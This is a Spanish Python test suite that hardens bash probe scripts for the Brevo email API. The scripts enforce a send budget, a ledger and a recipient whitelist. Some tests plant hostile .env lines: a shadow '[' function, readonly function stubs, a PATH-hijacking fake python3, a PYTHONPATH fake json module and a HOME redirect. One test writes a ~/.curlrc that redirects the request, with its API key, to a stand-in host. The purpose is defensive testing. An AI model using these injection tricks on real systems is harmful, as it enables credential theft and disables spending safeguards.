        r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan")
        tope = cifra(r"tope de la pasada entera[^0-9]*([0-9]+)", r.stdout)
        self.assertEqual(3, tope,
                         "'readonly' sombreado desde el .env borra el tope: vio %s\n%s\n%s"
                         % (tope, r.stdout[-1500:], r.stderr[-1500:]))
        req = b.home / ".cache" / "tfm" / "probe_brevo_b_unidad_cuota" / "req_real.json"
        self.assertTrue(req.exists(), "la fase 'plan' no construyo el cuerpo:\n%s\n%s"
                                      % (r.stdout[-1500:], r.stderr[-1500:]))
        self.assertEqual(["persona-3@example.invalid", "persona-1@example.invalid"], emails_de(req),
                         "la guarda del .env suplanto el sobre")
        self.assertNoSalioDelRepo()

    def test_h2_readonly_por_delante_no_gana(self):
        """El `.env` declarando los nombres readonly ANTES tampoco se los queda.

        Con un source, `readonly TOPE_PASADA=99` por delante hacia FALLAR la asignacion de
        la libreria; como ningun sondeo usa `set -e`, el proceso seguia con el 99 y salia
        con exito.
        """
        b = self.banco()
        b.reescribe_env("readonly TOPE_PASADA=99",
                        "readonly LIBRO=%s" % b.señuelo("libro_falso.tsv"),
                        "readonly PARADA=%s" % b.señuelo("parada_falsa.txt"))
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan")
        tope = cifra(r"tope de la pasada entera[^0-9]*([0-9]+)", r.stdout)
        self.assertEqual(3, tope, "el tope del .env gano: %s\n%s" % (tope, r.stdout[-1500:]))
        self.assertIn(str(b.libro_real), r.stdout,
                      "el libro que el sondeo declara no es el suyo:\n%s" % r.stdout[-1500:])
        self.assertFalse(b.señuelo("libro_falso.tsv").exists(),
                         "el libro se escribio en el señuelo del .env")

    def test_i_corchete_sombreado_no_apaga_el_freno(self):
        """Una funcion `[` en el `.env` no puede dejar pasar el tope ni la PARADA.

        Bash admite una funcion llamada `[` (comprobado: `declare -F [` funciona), y `[` es
        la forma que usaban TODAS las comparaciones. La que se planta aqui es selectiva:
        miente en las comparaciones del tope y de la PARADA y delega el resto en la orden
        interna, para que el sondeo se comporte con normalidad hasta el momento de mandar.
        """
        b = self.banco(modo="acepta", acepta="req_real")
        b.reescribe_env(
            "[ () {",
            '  case "$*" in',
            "    *' -gt '*|*brevo_parada*|*presupuesto_brevo*) return 1 ;;",
            '    *) builtin [ "$@" ;;',
            "  esac",
            "}",
        )
        b.siembra_libro(reservas=3)
        b.parada_real.write_text("2026-09-17T10:00:00Z\tsiembra\tun 2xx donde no debia\n")
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "enviar", extra={"PAUSA": "2"})
        envios = [c for c in b.llamadas() if c["metodo"] == "POST"]
        self.assertEqual(
            [], envios,
            "ATAQUE CONSUMADO: con una funcion '[' en el .env, el libro al tope y la "
            "PARADA puesta, salieron %d peticion(es) de envio de %r destinatarios cada "
            "una.\nrc=%s\n%s\n%s"
            % (len(envios), [c.get("destinatarios") for c in envios], r.returncode,
               r.stdout[-1500:], r.stderr[-1500:]))

    def test_i2_readonly_f_no_desarma_el_libro(self):
        """`readonly -f reservar` en el `.env` no puede dejar al sondeo sin libro."""
        b = self.banco(modo="acepta", acepta="req_real")
        b.reescribe_env("reservar () { :; }",
                        "libro_anota () { :; }",
                        "parada_comprobar () { :; }",
                        "readonly -f reservar libro_anota parada_comprobar")
        b.siembra_libro(reservas=3)
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "enviar", extra={"PAUSA": "2"})
        envios = [c for c in b.llamadas() if c["metodo"] == "POST"]
        self.assertEqual(
            [], envios,
            "ATAQUE CONSUMADO: con 'readonly -f reservar' en el .env el sondeo mando %d "
            "peticion(es) sin reserva y con el tope agotado.\nrc=%s\n%s\n%s"
            % (len(envios), r.returncode, r.stdout[-1500:], r.stderr[-1500:]))

    def test_j_path_del_env_no_suplanta_al_interprete(self):
        """Una linea `PATH=` en el `.env` no decide que python3 valida los destinatarios.

        De `PATH` salen el interprete de la guarda de la lista blanca y el propio curl. El
        python3 que se planta imprime dos direcciones ajenas cuando ve `lib_lista_blanca.py`
        entre sus argumentos, e imita el contrato de la guarda -- rc 0 y la envolvente por
        stdout -- para que el sondeo siga como si nada.
        """
        b = self.banco()
        falso = b.bin_falso("python3", PYTHON_FALSO)
        b.reescribe_env("PATH=%s:/usr/bin:/bin" % falso)
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan")
        req = b.home / ".cache" / "tfm" / "probe_brevo_b_unidad_cuota" / "req_real.json"
        self.assertTrue(req.exists(), "la fase 'plan' no construyo el cuerpo:\n%s\n%s"
                                      % (r.stdout[-1500:], r.stderr[-1500:]))
        self.assertEqual(
            ["persona-3@example.invalid", "persona-1@example.invalid"], emails_de(req),
            "ATAQUE CONSUMADO: con una linea PATH= en el .env, la guarda de la lista "
            "blanca la ejecuta un python3 plantado y el sobre sale con %r"
            % (emails_de(req),))

    def test_k_pythonpath_no_suplanta_el_json(self):
        """`PYTHONPATH` no puede suplantar `import json` dentro de los heredocs.

        Dos vias, y las dos tienen que fallar: por el `.env` -- que ya no se sourcea -- y
        por el entorno del que lanza el sondeo, que es de donde `python3 -I` lo ignora.
        """
        for via in ("env", "entorno"):
            b = self.banco()
            d = b.modulo_falso("json", JSON_FALSO)
            extra = {}
            if via == "env":
                b.reescribe_env("PYTHONPATH=%s" % d)
            else:
                extra["PYTHONPATH"] = str(d)
            r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan", extra=extra)
            req = b.home / ".cache" / "tfm" / "probe_brevo_b_unidad_cuota" / "req_real.json"
            self.assertTrue(req.exists(),
                            "[%s] la fase 'plan' no construyo el cuerpo:\n%s\n%s"
                            % (via, r.stdout[-1500:], r.stderr[-1500:]))
            self.assertEqual(
                ["persona-3@example.invalid", "persona-1@example.invalid"], emails_de(req),
                "ATAQUE CONSUMADO [%s]: un json.py plantado reescribe el fichero que se "
                "sube y verificar_cuerpo() lee el que le conviene. El fichero lleva %r"
                % (via, emails_de(req)))

    def test_l_home_del_env_no_mueve_el_libro(self):
        """Una linea `HOME=` en el `.env` no puede estrenar un libro vacio.

        `LIBRO` y `PARADA` se construyen con `$HOME`, asi que blindar el NOMBRE no servia
        de nada: el VALOR se interpolaba despues del source. El tope entero volvia en cada
        pasada y el freno entre sondeos se apagaba.
        """
        b = self.banco()
        otro = b.señuelo("otro_home")
        otro.mkdir(exist_ok=True)
        b.reescribe_env("HOME=%s" % otro)
        b.siembra_libro(reservas=3)
        b.parada_real.write_text("2026-09-17T10:00:00Z\tsiembra\tun 2xx donde no debia\n")
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "plan")
        # El libro PRIMERO, que es la comprobacion que no depende de como se rotule la
        # linea del presupuesto: si el sondeo declara un libro dentro del HOME del .env, el
        # ataque esta consumado aunque las cifras cuadren entre ellas.
        self.assertIn(str(b.libro_real), r.stdout,
                      "ATAQUE CONSUMADO: el libro que el sondeo declara no es el de "
                      "verdad.\n%s" % r.stdout[-1500:])
        self.assertFalse((otro / ".local").exists(),
                         "se creo un libro dentro del HOME del .env")
        visto = cifra(r"ya comprometidos en la ventana[^0-9]*([0-9]+)", r.stdout)
        self.assertEqual(
            3, visto,
            "con 'HOME=<otro>' en el .env el sondeo ve %s comprometidos en vez de 3, asi "
            "que el tope vuelve entero.\n%s" % (visto, r.stdout[-1500:]))


# =============================================================================
# EL LIBRO TIENE QUE PODER ESCRIBIR
# =============================================================================
class TestLibroSordo(BaseSondeo):

    def test_n_libro_no_escribible_no_manda(self):
        """Con el libro presente y no escribible no se envia nada.

        Es el caso sin ataque: 444 en el fichero, disco lleno, sistema de ficheros en solo
        lectura o atributo inmutable. El append fallaba con un «Permiso denegado» por
        stderr que nadie miraba, `reservar()` devolvia 0 e imprimia «reservados 2», y
        `libro_comprometido` volvia a leer 0: cada llamada creia tener el tope entero.
        """
        b = self.banco(modo="acepta", acepta="req_real")
        b.siembra_libro(reservas=0)
        antes = b.libro_real.read_text(encoding="utf-8")
        b.libro_real.chmod(0o444)
        self.addCleanup(b.libro_real.chmod, 0o644)
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "enviar", extra={"PAUSA": "2"})
        envios = [c for c in b.llamadas() if c["metodo"] == "POST"]
        self.assertEqual(
            [], envios,
            "ATAQUE CONSUMADO: con el libro en 444 salieron %d peticion(es) de envio que "
            "el libro no puede anotar.\nrc=%s\n%s\n%s"
            % (len(envios), r.returncode, r.stdout[-1500:], r.stderr[-1500:]))
        # Lo que se comprueba es la PROPIEDAD, no el numero: sin linea base la fase aborta
        # antes (exit 6, «el instrumento de medida no esta disponible») y no llega al exit 5
        # del libro. Las dos guardas son seguras, y fijar una sola daba un rojo que no
        # describia ningun agujero. Sembrar los tramos «antes» y «reposo» exigiria fixture
        # nueva, asi que se comprueba lo que el docstring promete: no sale nada y el libro
        # no se toca.
        self.assertIn(r.returncode, (5, 6),
                      "con el libro en 444 la fase tiene que abortar por una de sus dos "
                      "guardas: exit 5 (el libro no acepta escrituras) o exit 6 (sin linea "
                      "base no hay instrumento). Devolvio %s.\n%s"
                      % (r.returncode, r.stderr[-1500:]))
        self.assertEqual(
            antes, b.libro_real.read_text(encoding="utf-8"),
            "el libro en 444 no se ha podido anotar, asi que tampoco puede haber cambiado.")


# =============================================================================
# EL CURLRC, QUE CURL LEE AUNQUE SE LE PASE --config
# =============================================================================
class TestCurlrc(BaseSondeo):

    def test_o_el_q_va_primero(self):
        """`curl_brevo` tiene que llamar a curl con `-q` como PRIMER parametro.

        Cita del `man curl` de esta maquina (8.22.0): "it (unless --disable is used) checks
        for a default config file and uses it if found, even when --config is used", con el
        orden `$CURL_HOME/.curlrc`, `$XDG_CONFIG_HOME/curlrc`, `$HOME/.curlrc`. Un curlrc
        admite `url =`, `proxy =`, `insecure` y `output =`, y `CURL_HOME` y
        `XDG_CONFIG_HOME` las consume curl, no el shell: ni el orden de las asignaciones ni
        la limpieza de funciones las tocan. El `-q` solo surte efecto como primer parametro.
        """
        b = self.banco()
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "antes", extra={"PAUSA": "2"})
        llamadas = b.llamadas()
        self.assertTrue(llamadas, "la fase 'antes' no llamo a nada.\nrc=%s\n%s\n%s"
                                  % (r.returncode, r.stdout, r.stderr))
        for c in llamadas:
            argv = c.get("argv") or []
            self.assertEqual(
                "-q", (argv[0] if argv else None),
                "curl se llama sin '-q' por delante (%r), asi que lee ~/.curlrc, "
                "$CURL_HOME/.curlrc o $XDG_CONFIG_HOME/curlrc, y una sola linea 'url =' "
                "de ahi se lleva la cabecera api-key y el cuerpo a otro host."
                % (argv[:4],))

    def test_o2_un_curlrc_plantado_no_desvia_la_llamada(self):
        """Con un `~/.curlrc` que redirige la URL, la peticion sigue yendo a Brevo."""
        b = self.banco()
        (b.home / ".curlrc").write_text("url = http://127.0.0.1:1/robado\n")
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "antes", extra={"PAUSA": "2"})
        llamadas = b.llamadas()
        self.assertTrue(llamadas, "la fase 'antes' no llamo a nada.\nrc=%s\n%s"
                                  % (r.returncode, r.stderr[-1500:]))
        self.assertTrue(
            (llamadas[0]["url"] or "").startswith("https://api.brevo.com/v3"),
            "con un ~/.curlrc plantado la llamada salio hacia %r" % (llamadas[0]["url"],))


# =============================================================================
# EL BRAZO DE SANDBOX, RETIRADO
# =============================================================================
class TestSandboxRetirado(BaseSondeo):

    def test_p_la_fase_sandbox_no_llama_a_nada(self):
        """Pedir la fase retirada explica por que y no gasta nada."""
        b = self.banco(modo="acepta", acepta="req_sandbox")
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "sandbox")
        self.assertEqual([], b.llamadas(),
                         "la fase retirada llamo a %r" % (b.llamadas(),))
        self.assertEqual(2, r.returncode,
                         "pedir una fase retirada no puede terminar en exito: rc=%s\n%s"
                         % (r.returncode, r.stdout))
        self.assertIn("RETIR", r.stdout.upper(),
                      "la salida tiene que decir que la fase esta retirada:\n%s" % r.stdout)
        self.assertEqual([], b.movimientos(), "la fase retirada toco el libro")

    def test_p2_todo_manda_una_sola_peticion_y_no_pasa_del_tope(self):
        """La cadena entera manda UNA peticion y su coste cabe en el tope."""
        b = self.banco(modo="acepta", acepta="req_real")
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "todo",
                    extra={"PAUSA": "2", "ESPERA": "30"}, limite=300)
        envios = [c for c in b.llamadas() if c["metodo"] == "POST"]
        self.assertEqual(
            1, len(envios),
            "'todo' mando %d peticiones de envio y solo puede mandar una.\nrc=%s\n%s"
            % (len(envios), r.returncode, r.stdout[-2500:]))
        alcanzados = sum(len(c.get("correos") or []) for c in envios)
        self.assertEqual(2, alcanzados,
                         "'todo' alcanzo %d destinatarios y declara 2" % alcanzados)
        self.assertLessEqual(
            b.comprometido(), 3,
            "el libro quedo con %d comprometidos sobre un tope de 3:\n%s"
            % (b.comprometido(), b.movimientos()))
        for c in envios:
            self.assertEqual(
                ["persona-3@example.invalid", "persona-1@example.invalid"], c.get("correos"),
                "salio una peticion con destinatarios %r" % (c.get("correos"),))

    def test_q_el_coste_del_json_sale_de_la_constante(self):
        """La cifra del presupuesto no puede estar escrita a mano en el JSON.

        El caso p9 del preflight lo deja dicho: dos cifras distintas en el mismo
        presupuesto impreso es exactamente lo que la condicion 2 de D-046 prohibe.
        """
        b = self.banco(modo="acepta", acepta="req_real")
        r = b.corre("probe_brevo_b_unidad_cuota.sh", "todo",
                    extra={"PAUSA": "2", "ESPERA": "30"}, limite=300)
        pantalla = cifra(r"este sondeo gasta como mucho[^0-9]*([0-9]+)", r.stdout)
        jotas = sorted(b.herr.glob("probe_brevo_b_unidad_cuota_*.json"))
        self.assertTrue(jotas, "no se escribio el JSON de evidencia.\nrc=%s\n%s"
                               % (r.returncode, r.stdout[-2000:]))
        doc = json.loads(jotas[-1].read_text())
        self.assertEqual(
            pantalla, doc["presupuesto"]["coste_maximo_declarado_de_este_sondeo"],
            "la pantalla declara %s destinatarios y el JSON %s: dos cifras distintas en "
            "el mismo presupuesto."
            % (pantalla, doc["presupuesto"]["coste_maximo_declarado_de_este_sondeo"]))
        self.assertNotIn(CLAVE_FALSA, json.dumps(doc), "la clave entro en el JSON")


# =============================================================================
# EL CONTADOR DEL LIBRO, MIRADO DE CERCA
#
# Los dos casos de aqui no lanzan un sondeo: sourcean la libreria desde un guion minimo,
# porque lo que se mide es la aritmetica del libro y no el camino que lleva hasta ella.
# =============================================================================
class TestContadorDelLibro(BaseSondeo):

    def guion(self, b, cuerpo):
        g = b.herr / "harness_libro.sh"
        g.write_text('set -u\n'
                     '. "$(dirname "$0")/lib_env_brevo.sh"\n'
                     '. "$(dirname "$0")/lib_presupuesto_brevo.sh"\n'
                     'libro_init\n' + cuerpo)
        return b.corre("harness_libro.sh")

    def test_r_un_gasto_sin_reserva_cuenta(self):
        """`GASTO` sin una `RESERVA` detras no puede ser invisible para el tope.

        La aritmetica del libro suma `RESERVA` y `GASTO_DIRECTO` y resta `LIBERA`, asi que
        un `GASTO` a secas no sumaba nada: era correcto solo mientras todo `GASTO` fuese
        detras de una reserva de las mismas unidades, es decir, por convencion de quien
        llamaba. Ahora `libro_anota GASTO` mira si hay reserva de ese tramo y, si no la hay,
        escribe `GASTO_DIRECTO`, que si cuenta.
        """
        b = self.banco()
        r = self.guion(b, 'libro_anota GASTO tramo_sin_reserva "prueba" 2\n'
                          'printf "COMPROMETIDO=%s\\n" "$(libro_comprometido)"\n')
        visto = cifra(r"COMPROMETIDO=([0-9]+)", r.stdout)
        self.assertEqual(2, visto,
                         "un GASTO de 2 sin reserva previa deja el contador en %s: el tope "
                         "no ve ese gasto.\n%s\n%s" % (visto, r.stdout, r.stderr))
        movs = {m["movimiento"] for m in b.movimientos()}
        self.assertIn("GASTO_DIRECTO", movs,
                      "el movimiento tenia que escribirse como GASTO_DIRECTO: %r" % (movs,))

    def test_r2_un_libera_sin_reserva_no_resta(self):
        """Un `LIBERA` no puede restar mas de lo que su tramo tenga reservado."""
        b = self.banco()
        r = self.guion(b, 'libro_anota RESERVA tramo_a "prueba" 1\n'
                          'libro_anota LIBERA tramo_b "sin reserva detras" 3\n'
                          'printf "COMPROMETIDO=%s\\n" "$(libro_comprometido)"\n')
        visto = cifra(r"COMPROMETIDO=([0-9]+)", r.stdout)
        self.assertEqual(1, visto,
                         "un LIBERA de 3 sobre un tramo sin reserva dejo el contador en "
                         "%s.\n%s\n%s" % (visto, r.stdout, r.stderr))

    def test_s_la_ventana_no_es_el_dia_natural(self):
        """La pasada son 24 horas, no el dia UTC: cruzar medianoche no estrena tope.

        Con el dia natural, una pasada que cruce las 00:00 UTC dejaba de contar lo de antes
        y podia gastar 3 + 3. No es teorico: la escalera del tamano lleva `--max-time 600`
        por peldano y el sondeo del 429 puede obligar a esperar una hora.
        """
        b = self.banco()
        b.libro_real.parent.mkdir(parents=True, exist_ok=True)
        # 23 horas, no 3: asi el movimiento cae DENTRO de la ventana y, salvo que el reloj
        # ande por las 23:00 UTC, en un dia natural DISTINTO. Es lo que separa las dos
        # lecturas del libro.
        ayer = subprocess.run(["date", "-u", "-d", "23 hours ago", "+%Y-%m-%dT%H:%M:%SZ"],
                              capture_output=True, text=True).stdout.strip()
        anteayer = subprocess.run(["date", "-u", "-d", "30 hours ago",
                                   "+%Y-%m-%dT%H:%M:%SZ"],
                                  capture_output=True, text=True).stdout.strip()
        b.libro_real.write_text(
            "# libro de cuentas de los envios de Brevo (D-046 condicion 2)\n"
            "# tope de la pasada: 3 envios. La pasada son las ultimas 24 horas.\n"
            "%s\tRESERVA\tsiembra\thace_23_horas\t2\tdentro de la ventana\n"
            "%s\tRESERVA\tsiembra\thace_30_horas\t3\tfuera de la ventana\n"
            % (ayer, anteayer))
        r = self.guion(b, 'printf "COMPROMETIDO=%s\\n" "$(libro_comprometido)"\n')
        visto = cifra(r"COMPROMETIDO=([0-9]+)", r.stdout)
        self.assertEqual(
            2, visto,
            "la ventana tiene que contar los 2 de hace 23 horas y NO los 3 de hace "
            "treinta. El contador dice %s.\n%s\n%s" % (visto, r.stdout, r.stderr))


# =============================================================================
# LA EVIDENCIA COMO ARTEFACTO CITABLE (revision del 2026-09-17)
#
# Los cuatro casos de aqui no atacan el entorno: miden si el JSON que la datasheet CITA
# dice la verdad sobre la pasada que lo produjo. El 2026-09-17 el preflight escribio
# "envios_reales": 0 en el mismo resumen que declaraba "invariante_cero_envios": "ROTA",
# y el libro de cuentas anotaba GASTO de 1. Quien citara la evidencia leyendo solo su
# primer campo -- que es lo que el provenance apunta -- concluia que no se acepto nada.
# =============================================================================
class TestEvidenciaCitable(BaseSondeo):

    def preflight_con_p2_aceptada(self):
        """La pasada del 2026-09-17, reproducida: p1 rechazada y p2 ACEPTADA con 201."""
        b = self.banco(modo="acepta", acepta="p2_sender_sumidero")
        r = b.corre("probe_brevo_a_preflight_rechazo.sh")
        jotas = sorted(b.herr.glob("probe_brevo_a_preflight_rechazo_*.json"))
        self.assertTrue(jotas, "no se escribio el JSON de evidencia.\nrc=%s\n%s\n%s"
                               % (r.returncode, r.stdout[-2000:], r.stderr[-2000:]))
        doc = json.loads(jotas[-1].read_text())
        self.assertEqual(
            "ROTA", doc["resumen"]["invariante_cero_envios"],
            "el banco no reprodujo la pasada: p2 tenia que salir ACEPTADA.\n%s"
            % r.stdout[-2000:])
        self.assertNotIn(CLAVE_FALSA, json.dumps(doc), "la clave entro en el JSON")
        return b, r, doc

    def test_t_el_coste_del_json_no_es_una_constante(self):
        """`envios_reales` tiene que salir de lo aceptado, no de un literal.

        El campo esta cableado a 0 en los ocho sondeos, asi que diria 0 aunque los ocho
        casos volvieran con 201. La unidad es la del libro de cuentas: el DESTINATARIO de
        una peticion aceptada.
        """
        b, r, doc = self.preflight_con_p2_aceptada()
        gasto = sum(m["unidades"] for m in b.movimientos()
                    if m["movimiento"] in ("GASTO", "GASTO_DIRECTO"))
        self.assertEqual(
            1, gasto,
            "el libro tenia que anotar 1 destinatario gastado: %s" % (b.movimientos(),))
        self.assertEqual(
            gasto, doc["resumen"]["envios_reales"],
            "el libro anota %s destinatario(s) gastado(s) y la evidencia citable declara "
            "envios_reales=%s. Dos cifras distintas en el mismo presupuesto es lo que la "
            "condicion 2 de D-046 prohibe, y la que se cita es la del JSON."
            % (gasto, doc["resumen"]["envios_reales"]))

    def test_u_la_evidencia_registra_hacia_donde_salio(self):
        """El volcado tiene que probar el destino, no obligar a leer el script.

        La garantia central de D-046 -- ninguna direccion de la lista blanca se toco -- no
        es verificable desde una evidencia que solo guarda la RESPUESTA y, de la peticion,
        su tamaño en bytes. Y el remitente y la cabecera de sandbox, que el provenance cita
        como literales, tampoco estan.
        """
        b, r, doc = self.preflight_con_p2_aceptada()
        self.assertFalse(
            "readonly" in r.stderr.lower() or "solo lectura" in r.stderr.lower(),
            "bash se quejo de una variable de solo lectura en el prefijo de entorno, asi "
            "que algo no llego al proceso hijo:\n%s" % r.stderr[-800:])
        casos = {c["caso"]: c for c in doc["casos"]}
        self.assertIn("p2_sender_sumidero", casos, "falta el caso aceptado en el volcado")
        p2 = casos["p2_sender_sumidero"]
        self.assertIn("peticion", p2,
                      "el caso no registra la peticion, solo la respuesta: %s"
                      % sorted(p2))
        pet = p2["peticion"]
        self.assertEqual(
            ["sonda-00001@example.invalid"], pet["destinatarios"]["direcciones"],
            "la evidencia no deja leer el destinatario que salio de verdad: %r" % (pet,))
        self.assertEqual(1, pet["destinatarios"]["n"])
        self.assertEqual(["example.invalid"], pet["destinatarios"]["dominios"])
        self.assertEqual(
            "sonda-remitente@example.invalid", pet["sender"],
            "el remitente que el provenance cita como literal no esta en la evidencia: %r"
            % (pet,))
        self.assertTrue(
            any("x-sib-sandbox" in h.lower() for h in pet["cabeceras"]),
            "la cabecera de sandbox no se registra, y sin ella el 201 no se puede leer: %r"
            % (pet,))

    def test_v_ningun_sondeo_cablea_el_coste(self):
        """El literal `"envios_reales":0` no puede vivir en el codigo de ningun sondeo.

        Con una excepcion, y es la unica: un resumen que declara `"peticiones":0` habla de
        una ejecucion que no llamo a nada -- la rama NO EJECUTABLE de la segmentacion, sin
        la segunda clave de API-- y ahi el cero no es una suposicion sobre la validacion
        del proveedor, es la cuenta de una lista vacia.
        """
        cableados = []
        for p in sorted(HERR.glob("probe_brevo_*.sh")):
            for n, linea in enumerate(p.read_text().splitlines(), 1):
                if (re.search(r'"envios_reales"\s*:\s*0\b', linea)
                        and not re.search(r'"peticiones"\s*:\s*0\b', linea)):
                    cableados.append("%s:%d" % (p.name, n))
        self.assertEqual(
            [], cableados,
            "estos sondeos escriben el coste a mano, asi que su resumen diria 0 aunque "
            "todas sus peticiones volvieran con 201: %s" % ", ".join(cableados))

    def test_w_el_rotulo_no_garantiza_lo_ya_refutado(self):
        """El presupuesto declarado no puede prometer lo que la medicion tumbo.

        `p2_sender_sumidero` volvio con 201 el 2026-09-17: «ninguna peticion puede ser
        aceptada» es falso, y es justo la frase que el rotulo imprime al arrancar y la
        cabecera declara como coste.
        """
        b, r, doc = self.preflight_con_p2_aceptada()
        rotulo = r.stdout.split("-- p1_sender_ausente")[0]
        self.assertFalse(
            "ninguna" in rotulo.lower() and "puede ser aceptada" in rotulo.lower(),
            "el rotulo del presupuesto sigue garantizando que ninguna peticion puede ser "
            "aceptada, en la misma ejecucion en la que una lo fue:\n%s" % rotulo)
        self.assertNotIn(
            "Ninguna puede ser aceptada",
            (HERR / "probe_brevo_a_preflight_rechazo.sh").read_text(),
            "la cabecera del script declara como coste una invariante refutada")


# Los sondeos de lectura que resumen su coste a partir de sus casos.
SONDEOS_DE_LECTURA = (
    "probe_brevo_a_429_rps.sh",
    "probe_brevo_a_ventana_y_reset.sh",
    "probe_brevo_a_caudal_solo_lectura.sh",
)


class TestCosteDeLosSondeosDeLectura(BaseSondeo):
    """El coste de un sondeo de lectura sale de lo que curl dice que hizo, no de un rotulo.

    `test_v` prohibe el literal `"envios_reales": 0`. Un contador que suma los casos con
    `metodo == "POST"` lo cumple, pero si cada caso lleva `"metodo": "GET"` escrito a mano
    el contador vale cero por construccion: es el mismo cero cableado, un paso mas lejos.
    """

    def resumen_de(self, sondeo, **extra):
        b = self.banco()
        salida = b.raiz / ("%s.json" % sondeo)
        r = b.corre(sondeo, str(salida), extra=extra or None)
        self.assertTrue(salida.exists(),
                        "%s no escribio su volcado:\n%s" % (sondeo, r.stderr[-800:]))
        return b, json.loads(salida.read_text())["resumen"]

    def test_x_un_post_aceptado_cuenta_como_envio(self):
        """Si curl informa de un POST que vuelve con 201, el resumen no puede decir cero."""
        for sondeo in SONDEOS_DE_LECTURA:
            with self.subTest(sondeo=sondeo):
                b, res = self.resumen_de(sondeo, FALSO_CURL_METODO="POST")
                n = len(b.llamadas())
                self.assertGreater(n, 0, "el sondeo no llego a llamar a curl")
                self.assertEqual(
                    n, res["envios_reales"],
                    "curl informo de %d POST aceptados y el resumen dice %r envios: el "
                    "metodo de cada caso no sale de la peticion" % (n, res["envios_reales"]))
                if "peticiones_de_envio" in res:
                    self.assertEqual(n, res["peticiones_de_envio"])
                if "invariante_cero_envios" in res:
                    self.assertEqual("ROTA", res["invariante_cero_envios"])

    def test_y_solo_lecturas_dan_coste_cero(self):
        """Con curl informando de GET, cero envios y la invariante cumplida."""
        for sondeo in SONDEOS_DE_LECTURA:
            with self.subTest(sondeo=sondeo):
                b, res = self.resumen_de(sondeo)
                self.assertEqual(0, res["envios_reales"])
                if "invariante_cero_envios" in res:
                    self.assertEqual("CUMPLIDA", res["invariante_cero_envios"])


if __name__ == "__main__":
    unittest.main(verbosity=2)

